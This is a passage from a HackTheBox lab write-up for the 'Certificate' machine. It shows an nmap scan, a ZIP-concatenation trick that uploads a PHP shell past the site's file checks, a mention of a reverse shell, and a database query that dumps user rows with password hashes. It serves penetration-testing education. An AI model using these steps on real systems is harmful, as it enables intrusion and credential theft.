---
categories: HackTheBox
tags: [Active_Directory, ADCS, Golden_Certificate, ESC3, SeManageVolumePrivilege, certutil, BloodHound, PrivEsc, Certipy-ad]
description: This is a AD machine where you have to deal with Golden Certificate Attack.
media_subpath: /assets/images/
image:
  path: certificate.png
  alt: Active Directory Hard Level Machine 🐱
  width: "1200"
  height: "630"
img_path: /assets/images/
---

| Machine Link 🛡️   | [Certificate](https://app.hackthebox.com/machines/Certificate)        |
| ------------------ | -------------------------------------------- |
| Operating System   | <mark style="background: #FFB8EBA6;">Active Directory </mark>                            |
| Difficulty         | <mark style="background: #FF5582A6;">Hard</mark>                                         |
| Machine Created by | [Spectra199](https://app.hackthebox.com/users/414823) |

___

## 1️⃣ Introduction

**Vulnerabilities/Concepts:** Web file upload bypass via ZIP exploit, reverse shell, database credential extraction, password hash cracking, Kerberos pre-authentication hash extraction from PCAP, ADCS vulnerabilities (ESC3), SeManageVolumePrivilege abuse, Golden Certificate Attack for domain admin escalation. 

**Learning goals**: Understanding Active Directory Certificate Services (ADCS) misconfigurations, Windows privilege escalation techniques, Kerberos authentication flaws, and certificate-based attacks in domain environments. 

**Ethical note on authorized testing**: This walkthrough is based on a lab environment; always obtain explicit permission before performing penetration testing on real systems to avoid legal issues.

## 2️⃣ Port Scanning

**Why**: Port scanning identifies open ports, services, and versions, providing an entry point for enumeration and potential vulnerabilities in a target system like this Windows domain controller.

**Commands:**

```bash
sudo nmap -sC -sV -p- -vv -T4 -Pn -oN Nmap_Result.txt 10.10.11.71
```
{: .nolineno }

**Flag Breakdown:**

- `-sC`: Executes default NSE (Nmap Scripting Engine) scripts for service detection and vulnerability checks
- `-sV`: Performs version detection on identified services
- `-p-`: Scans all 65,535 TCP ports (comprehensive coverage vs default 1000 ports)
- `-vv`: Very verbose output for real-time progress monitoring
- `-T4`: Aggressive timing template (faster scans, higher detection risk)
- `-Pn`:  Skips host discovery (assuming the host is up)
- `-oN`: Outputs results in normal format to specified file

**Scan Results:**

```bash
└─$ sudo nmap -sC -sV -vv -T4 -Pn -oN Nmap_Result.txt 10.10.11.71

PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 127 Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://certificate.htb/
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-09-11 18:38:16Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Issuer: commonName=Certificate-LTD-CA/domainComponent=certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-11-04T03:14:54
| Not valid after:  2025-11-04T03:14:54
| MD5:   0252:f5f4:2869:d957:e8fa:5c19:dfc5:d8ba
| SHA-1: 779a:97b1:d8e4:92b5:bafe:bc02:3388:45ff:dff7:6ad2
| -----BEGIN CERTIFICATE-----
| MIIGTDCCBTSgAwIBAgITWAAAAALKcOpOQvIYpgAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBPMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLY2VydGlm
| aWNhdGUxGzAZBgNVBAMTEkNlcnRpZmljYXRlLUxURC1DQTAeFw0yNDExMDQwMzE0
| NTRaFw0yNTExMDQwMzE0NTRaMB8xHTAbBgNVBAMTFERDMDEuY2VydGlmaWNhdGUu
| aHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAokh23/3HZrU3FA6t
| JQFbvrM0+ee701Q0/0M4ZQ3r1THuGXvtHnqHFBjJSY/p0SQ0j/jeCAiSwlnG/Wf6
| 6px9rUwjG7gfzH6WqoAMOlpf+HMJ+ypwH59+tktARf17OrrnMHMYXwwILUZfJjH1
| 73VnWwxodz32ZKklgqeHLASWke63yp7QM31vnZBnolofe6gV3pf6ZEJ58sNY+X9A
| t+cFnBtJcQ7TbxhB7zJHICHHn2qFRxL7u6GPPMeC0KdL8zDskn34UZpK6gyV+bNM
| G78cW3QFP00i+ixHkPUxGZho8b708FfRbEKuxSzL4auGuAhsE+ElWna1fBiuhmCY
| DNnA7QIDAQABo4IDTzCCA0swLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBD
| AG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD
| ATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgIC
| AIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJ
| YIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNV
| HQ4EFgQURw6wHadBRcMGfsqMbHNqwpNKRi4wHwYDVR0jBBgwFoAUOuH3UW3vrUoY
| d0Gju7uF5m6Uc6IwgdEGA1UdHwSByTCBxjCBw6CBwKCBvYaBumxkYXA6Ly8vQ049
| Q2VydGlmaWNhdGUtTFRELUNBLENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtl
| eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2Vy
| dGlmaWNhdGUsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9v
| YmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCByAYIKwYBBQUHAQEEgbsw
| gbgwgbUGCCsGAQUFBzAChoGobGRhcDovLy9DTj1DZXJ0aWZpY2F0ZS1MVEQtQ0Es
| Q049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENO
| PUNvbmZpZ3VyYXRpb24sREM9Y2VydGlmaWNhdGUsREM9aHRiP2NBQ2VydGlmaWNh
| dGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1Ud
| EQQ5MDegHwYJKwYBBAGCNxkBoBIEEAdHN3ziVeJEnb0gcZhtQbWCFERDMDEuY2Vy
| dGlmaWNhdGUuaHRiME4GCSsGAQQBgjcZAgRBMD+gPQYKKwYBBAGCNxkCAaAvBC1T
| LTEtNS0yMS01MTU1Mzc2NjktNDIyMzY4NzE5Ni0zMjQ5NjkwNTgzLTEwMDAwDQYJ
| KoZIhvcNAQELBQADggEBAIEvfy33XN4pVXmVNJW7yOdOTdnpbum084aK28U/AewI
| UUN3ZXQsW0ZnGDJc0R1b1HPcxKdOQ/WLS/FfTdu2YKmDx6QAEjmflpoifXvNIlMz
| qVMbT3PvidWtrTcmZkI9zLhbsneGFAAHkfeGeVpgDl4OylhEPC1Du2LXj1mZ6CPO
| UsAhYCGB6L/GNOqpV3ltRu9XOeMMZd9daXHDQatNud9gGiThPOUxFnA2zAIem/9/
| UJTMmj8IP/oyAEwuuiT18WbLjEZG+ALBoJwBjcXY6x2eKFCUvmdqVj1LvH9X+H3q
| S6T5Az4LLg9d2oa4YTDC7RqiubjJbZyF2C3jLIWQmA8=
|_-----END CERTIFICATE-----
|_ssl-date: 2025-09-11T18:39:52+00:00; +8h00m07s from scanner time.
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-11T18:39:51+00:00; +8h00m07s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Issuer: commonName=Certificate-LTD-CA/domainComponent=certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-11-04T03:14:54
| Not valid after:  2025-11-04T03:14:54
| MD5:   0252:f5f4:2869:d957:e8fa:5c19:dfc5:d8ba
| SHA-1: 779a:97b1:d8e4:92b5:bafe:bc02:3388:45ff:dff7:6ad2
| -----BEGIN CERTIFICATE-----
| MIIGTDCCBTSgAwIBAgITWAAAAALKcOpOQvIYpgAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBPMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLY2VydGlm
| aWNhdGUxGzAZBgNVBAMTEkNlcnRpZmljYXRlLUxURC1DQTAeFw0yNDExMDQwMzE0
| NTRaFw0yNTExMDQwMzE0NTRaMB8xHTAbBgNVBAMTFERDMDEuY2VydGlmaWNhdGUu
| aHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAokh23/3HZrU3FA6t
| JQFbvrM0+ee701Q0/0M4ZQ3r1THuGXvtHnqHFBjJSY/p0SQ0j/jeCAiSwlnG/Wf6
| 6px9rUwjG7gfzH6WqoAMOlpf+HMJ+ypwH59+tktARf17OrrnMHMYXwwILUZfJjH1
| 73VnWwxodz32ZKklgqeHLASWke63yp7QM31vnZBnolofe6gV3pf6ZEJ58sNY+X9A
| t+cFnBtJcQ7TbxhB7zJHICHHn2qFRxL7u6GPPMeC0KdL8zDskn34UZpK6gyV+bNM
| G78cW3QFP00i+ixHkPUxGZho8b708FfRbEKuxSzL4auGuAhsE+ElWna1fBiuhmCY
| DNnA7QIDAQABo4IDTzCCA0swLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBD
| AG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD
| ATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgIC
| AIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJ
| YIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNV
| HQ4EFgQURw6wHadBRcMGfsqMbHNqwpNKRi4wHwYDVR0jBBgwFoAUOuH3UW3vrUoY
| d0Gju7uF5m6Uc6IwgdEGA1UdHwSByTCBxjCBw6CBwKCBvYaBumxkYXA6Ly8vQ049
| Q2VydGlmaWNhdGUtTFRELUNBLENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtl
| eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2Vy
| dGlmaWNhdGUsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9v
| YmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCByAYIKwYBBQUHAQEEgbsw
| gbgwgbUGCCsGAQUFBzAChoGobGRhcDovLy9DTj1DZXJ0aWZpY2F0ZS1MVEQtQ0Es
| Q049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENO
| PUNvbmZpZ3VyYXRpb24sREM9Y2VydGlmaWNhdGUsREM9aHRiP2NBQ2VydGlmaWNh
| dGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1Ud
| EQQ5MDegHwYJKwYBBAGCNxkBoBIEEAdHN3ziVeJEnb0gcZhtQbWCFERDMDEuY2Vy
| dGlmaWNhdGUuaHRiME4GCSsGAQQBgjcZAgRBMD+gPQYKKwYBBAGCNxkCAaAvBC1T
| LTEtNS0yMS01MTU1Mzc2NjktNDIyMzY4NzE5Ni0zMjQ5NjkwNTgzLTEwMDAwDQYJ
| KoZIhvcNAQELBQADggEBAIEvfy33XN4pVXmVNJW7yOdOTdnpbum084aK28U/AewI
| UUN3ZXQsW0ZnGDJc0R1b1HPcxKdOQ/WLS/FfTdu2YKmDx6QAEjmflpoifXvNIlMz
| qVMbT3PvidWtrTcmZkI9zLhbsneGFAAHkfeGeVpgDl4OylhEPC1Du2LXj1mZ6CPO
| UsAhYCGB6L/GNOqpV3ltRu9XOeMMZd9daXHDQatNud9gGiThPOUxFnA2zAIem/9/
| UJTMmj8IP/oyAEwuuiT18WbLjEZG+ALBoJwBjcXY6x2eKFCUvmdqVj1LvH9X+H3q
| S6T5Az4LLg9d2oa4YTDC7RqiubjJbZyF2C3jLIWQmA8=
|_-----END CERTIFICATE-----
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-11T18:39:52+00:00; +8h00m07s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Issuer: commonName=Certificate-LTD-CA/domainComponent=certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-11-04T03:14:54
| Not valid after:  2025-11-04T03:14:54
| MD5:   0252:f5f4:2869:d957:e8fa:5c19:dfc5:d8ba
| SHA-1: 779a:97b1:d8e4:92b5:bafe:bc02:3388:45ff:dff7:6ad2
| -----BEGIN CERTIFICATE-----
| MIIGTDCCBTSgAwIBAgITWAAAAALKcOpOQvIYpgAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBPMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLY2VydGlm
| aWNhdGUxGzAZBgNVBAMTEkNlcnRpZmljYXRlLUxURC1DQTAeFw0yNDExMDQwMzE0
| NTRaFw0yNTExMDQwMzE0NTRaMB8xHTAbBgNVBAMTFERDMDEuY2VydGlmaWNhdGUu
| aHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAokh23/3HZrU3FA6t
| JQFbvrM0+ee701Q0/0M4ZQ3r1THuGXvtHnqHFBjJSY/p0SQ0j/jeCAiSwlnG/Wf6
| 6px9rUwjG7gfzH6WqoAMOlpf+HMJ+ypwH59+tktARf17OrrnMHMYXwwILUZfJjH1
| 73VnWwxodz32ZKklgqeHLASWke63yp7QM31vnZBnolofe6gV3pf6ZEJ58sNY+X9A
| t+cFnBtJcQ7TbxhB7zJHICHHn2qFRxL7u6GPPMeC0KdL8zDskn34UZpK6gyV+bNM
| G78cW3QFP00i+ixHkPUxGZho8b708FfRbEKuxSzL4auGuAhsE+ElWna1fBiuhmCY
| DNnA7QIDAQABo4IDTzCCA0swLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBD
| AG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD
| ATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgIC
| AIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJ
| YIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNV
| HQ4EFgQURw6wHadBRcMGfsqMbHNqwpNKRi4wHwYDVR0jBBgwFoAUOuH3UW3vrUoY
| d0Gju7uF5m6Uc6IwgdEGA1UdHwSByTCBxjCBw6CBwKCBvYaBumxkYXA6Ly8vQ049
| Q2VydGlmaWNhdGUtTFRELUNBLENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtl
| eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2Vy
| dGlmaWNhdGUsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9v
| YmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCByAYIKwYBBQUHAQEEgbsw
| gbgwgbUGCCsGAQUFBzAChoGobGRhcDovLy9DTj1DZXJ0aWZpY2F0ZS1MVEQtQ0Es
| Q049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENO
| PUNvbmZpZ3VyYXRpb24sREM9Y2VydGlmaWNhdGUsREM9aHRiP2NBQ2VydGlmaWNh
| dGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1Ud
| EQQ5MDegHwYJKwYBBAGCNxkBoBIEEAdHN3ziVeJEnb0gcZhtQbWCFERDMDEuY2Vy
| dGlmaWNhdGUuaHRiME4GCSsGAQQBgjcZAgRBMD+gPQYKKwYBBAGCNxkCAaAvBC1T
| LTEtNS0yMS01MTU1Mzc2NjktNDIyMzY4NzE5Ni0zMjQ5NjkwNTgzLTEwMDAwDQYJ
| KoZIhvcNAQELBQADggEBAIEvfy33XN4pVXmVNJW7yOdOTdnpbum084aK28U/AewI
| UUN3ZXQsW0ZnGDJc0R1b1HPcxKdOQ/WLS/FfTdu2YKmDx6QAEjmflpoifXvNIlMz
| qVMbT3PvidWtrTcmZkI9zLhbsneGFAAHkfeGeVpgDl4OylhEPC1Du2LXj1mZ6CPO
| UsAhYCGB6L/GNOqpV3ltRu9XOeMMZd9daXHDQatNud9gGiThPOUxFnA2zAIem/9/
| UJTMmj8IP/oyAEwuuiT18WbLjEZG+ALBoJwBjcXY6x2eKFCUvmdqVj1LvH9X+H3q
| S6T5Az4LLg9d2oa4YTDC7RqiubjJbZyF2C3jLIWQmA8=
|_-----END CERTIFICATE-----
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Issuer: commonName=Certificate-LTD-CA/domainComponent=certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-11-04T03:14:54
| Not valid after:  2025-11-04T03:14:54
| MD5:   0252:f5f4:2869:d957:e8fa:5c19:dfc5:d8ba
| SHA-1: 779a:97b1:d8e4:92b5:bafe:bc02:3388:45ff:dff7:6ad2
| -----BEGIN CERTIFICATE-----
| MIIGTDCCBTSgAwIBAgITWAAAAALKcOpOQvIYpgAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBPMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLY2VydGlm
| aWNhdGUxGzAZBgNVBAMTEkNlcnRpZmljYXRlLUxURC1DQTAeFw0yNDExMDQwMzE0
| NTRaFw0yNTExMDQwMzE0NTRaMB8xHTAbBgNVBAMTFERDMDEuY2VydGlmaWNhdGUu
| aHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAokh23/3HZrU3FA6t
| JQFbvrM0+ee701Q0/0M4ZQ3r1THuGXvtHnqHFBjJSY/p0SQ0j/jeCAiSwlnG/Wf6
| 6px9rUwjG7gfzH6WqoAMOlpf+HMJ+ypwH59+tktARf17OrrnMHMYXwwILUZfJjH1
| 73VnWwxodz32ZKklgqeHLASWke63yp7QM31vnZBnolofe6gV3pf6ZEJ58sNY+X9A
| t+cFnBtJcQ7TbxhB7zJHICHHn2qFRxL7u6GPPMeC0KdL8zDskn34UZpK6gyV+bNM
| G78cW3QFP00i+ixHkPUxGZho8b708FfRbEKuxSzL4auGuAhsE+ElWna1fBiuhmCY
| DNnA7QIDAQABo4IDTzCCA0swLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBD
| AG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD
| ATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgIC
| AIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJ
| YIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNV
| HQ4EFgQURw6wHadBRcMGfsqMbHNqwpNKRi4wHwYDVR0jBBgwFoAUOuH3UW3vrUoY
| d0Gju7uF5m6Uc6IwgdEGA1UdHwSByTCBxjCBw6CBwKCBvYaBumxkYXA6Ly8vQ049
| Q2VydGlmaWNhdGUtTFRELUNBLENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtl
| eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2Vy
| dGlmaWNhdGUsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9v
| YmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCByAYIKwYBBQUHAQEEgbsw
| gbgwgbUGCCsGAQUFBzAChoGobGRhcDovLy9DTj1DZXJ0aWZpY2F0ZS1MVEQtQ0Es
| Q049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENO
| PUNvbmZpZ3VyYXRpb24sREM9Y2VydGlmaWNhdGUsREM9aHRiP2NBQ2VydGlmaWNh
| dGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1Ud
| EQQ5MDegHwYJKwYBBAGCNxkBoBIEEAdHN3ziVeJEnb0gcZhtQbWCFERDMDEuY2Vy
| dGlmaWNhdGUuaHRiME4GCSsGAQQBgjcZAgRBMD+gPQYKKwYBBAGCNxkCAaAvBC1T
| LTEtNS0yMS01MTU1Mzc2NjktNDIyMzY4NzE5Ni0zMjQ5NjkwNTgzLTEwMDAwDQYJ
| KoZIhvcNAQELBQADggEBAIEvfy33XN4pVXmVNJW7yOdOTdnpbum084aK28U/AewI
| UUN3ZXQsW0ZnGDJc0R1b1HPcxKdOQ/WLS/FfTdu2YKmDx6QAEjmflpoifXvNIlMz
| qVMbT3PvidWtrTcmZkI9zLhbsneGFAAHkfeGeVpgDl4OylhEPC1Du2LXj1mZ6CPO
| UsAhYCGB6L/GNOqpV3ltRu9XOeMMZd9daXHDQatNud9gGiThPOUxFnA2zAIem/9/
| UJTMmj8IP/oyAEwuuiT18WbLjEZG+ALBoJwBjcXY6x2eKFCUvmdqVj1LvH9X+H3q
| S6T5Az4LLg9d2oa4YTDC7RqiubjJbZyF2C3jLIWQmA8=
|_-----END CERTIFICATE-----
|_ssl-date: 2025-09-11T18:39:52+00:00; +8h00m08s from scanner time.
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Hosts: certificate.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-11T18:39:14
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 50770/tcp): CLEAN (Timeout)
|   Check 2 (port 53753/tcp): CLEAN (Timeout)
|   Check 3 (port 43669/udp): CLEAN (Timeout)
|   Check 4 (port 31243/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 8h00m06s, deviation: 0s, median: 8h00m06s
```
{: .nolineno }

| Port     | Service      | Description                                                       | Relevance in Pentesting                                                       |
| -------- | ------------ | ----------------------------------------------------------------- | ----------------------------------------------------------------------------- |
| 53/tcp   | domain       | Simple DNS Plus                                                   | Potential for DNS zone transfers or spoofing in AD environments.              |
| 80/tcp   | http         | Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)                    | Web app enumeration; redirects to certificate.htb, possible vuln in PHP site. |
| 88/tcp   | kerberos-sec | Microsoft Windows Kerberos                                        | AD authentication; vulnerable to AS-REP roasting if pre-auth disabled.        |
| 135/tcp  | msrpc        | Microsoft Windows RPC                                             | Endpoint for remote procedure calls; often used in lateral movement.          |
| 139/tcp  | netbios-ssn  | Microsoft Windows NetBIOS                                         | Legacy file sharing; potential for null sessions or info leaks.               |
| 389/tcp  | ldap         | Microsoft Windows Active Directory LDAP (Domain: certificate.htb) | User/group enumeration; SSL cert details reveal CA setup.                     |
| 445/tcp  | microsoft-ds | SMB                                                               | File shares; credential dumping or relay attacks.                             |
| 464/tcp  | kpasswd5     | Kerberos password change                                          | AD password resets; potential for offline cracking if captured.               |
| 593/tcp  | ncacn_http   | Microsoft Windows RPC over HTTP 1.0                               | Remote management; exploitable with valid creds.                              |
| 636/tcp  | ssl/ldap     | Secure LDAP (Domain: certificate.htb)                             | Encrypted directory queries; cert details match CA.                           |
| 3268/tcp | ldap         | Global Catalog LDAP                                               | Cross-forest searches; similar cert info.                                     |
| 3269/tcp | ssl/ldap     | Secure Global Catalog LDAP                                        | Encrypted cross-forest; cert validity until 2025.                             |
| 5985/tcp | http         | Microsoft HTTPAPI httpd 2.0 (WinRM)                               | Remote management; shell access with creds.                                   |

**Notes**: This scan assumes the target is responsive (-Pn), which risks false positives if down; alternatives like rustscan or masscan for speed. Risks include detection by IDS/IPS due to aggressive timing (-T4); use -T2 for stealth. Outputs highlight ADCS presence (repeated certs), guiding further enum on certificate.htb domain.

## 3️⃣ Web Enumeration

**Tools**: Browser for manual navigation; no specific automated tools mentioned beyond initial access.

**Content**:

I checked the port 80 and got this course site that lets me register and login as student account and not as teacher account.

![](Pasted%20image%2020250912093842.png)
_Register user `hacker` as student_

Now I navigated to <kbd>Home</kbd> >> <kbd>Courses</kbd> >> <kbd>Course Details</kbd> >> <kbd>Enroll the Course</kbd> >> <kbd>After that scroll down there is a quiz submit option click that</kbd> >> <kbd>upload page</kbd>

![](Pasted%20image%2020250912094330.png)
_Quiz Submit option_


I get File upload page that takes only Zip file and within zip it takes only formats like .pdf .docx .pptx .xlsx .

![](Pasted%20image%2020250912094504.png)
_Upload File page_

## 4️⃣ ZIP Exploit and Reverse Shell

**Tools**: ZIP utilities (zip command); revshells.com for payload generation.

**Content**:
Exploited ZIP upload restrictions by crafting a malicious ZIP bypassing checks.🔻

I will be using `phpinfo();` for check that it will work or not : 

```bash
zip a.zip legit.pdf                   

mkdir malicious_files

echo '<?php phpinfo(); ?>' > malicious_files/shell.php

zip -r malicious.zip malicious_files/

cat a.zip malicious.zip > combined.zip
```
{: .nolineno }

Now upload the `combined.zip` file, and after that in upload link file in place of `legit.pdf` use `malicious_files/shell.php` and that is the result I got 🔻

![](Pasted%20image%2020250912091652.png)
_phpinfo() uploaded into the upload page_

Let's have a reverse shell now  🔻

I used this [revshell.com](https://www.revshells.com/) >>> <kbd>PHP Ivan Sincek </kbd> payload and changed the IP and port for receiving the reverseshell.

## 5️⃣ User Shell as <b><span style="color:rgb(219, 0, 0)">xamppuser</span></b>


After getting shell I got the `db.php` file and some creds 🔻

```php
C:\xampp\htdocs\certificate.htb>type db.php
<?php
// Database connection using PDO
try {
    $dsn = 'mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4';
    $db_user = 'certificate_webapp_user'; // Change to your DB username
    $db_passwd = 'cert*********'; // Change to your DB password
    $options = [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ];
    $pdo = new PDO($dsn, $db_user, $db_passwd, $options);
} catch (PDOException $e) {
    die('Database connection failed: ' . $e->getMessage());
}
?>
```
{: .nolineno }

I will be using this database name, user and password to extract the information's inside the `users` tables.

## 6️⃣ Database Credential Extraction

**Tools**: MySQL client (mysql.exe on target).

**Content**:

Used extracted DB creds to query: 

```powershell
PS C:\xampp\mysql\bin> .\mysql.exe -u certificate_webapp_user -p"cert*********" -h 127.0.0.1 -e "USE certificate_webapp_db; SELECT * FROM users LIMIT 8;"

id	first_name	last_name	username	email	password	created_at	role	is_active
1	Lorra	Armessa	Lorra.AAA	lorra.aaa@certificate.htb	$2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG	2024-12-23 12:43:10	teacher	1
6	Sara	Laracrof	Sara1200	sara1200@gmail.com	$2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK	2024-12-23 12:47:11	teacher	1
7	John	Wood	Johney	johny009@mail.com	$2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq	2024-12-23 13:18:18	student	1
8	Havok	Watterson	havokww	havokww@hotmail.com	$2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti	2024-12-24 09:08:04	teacher	1
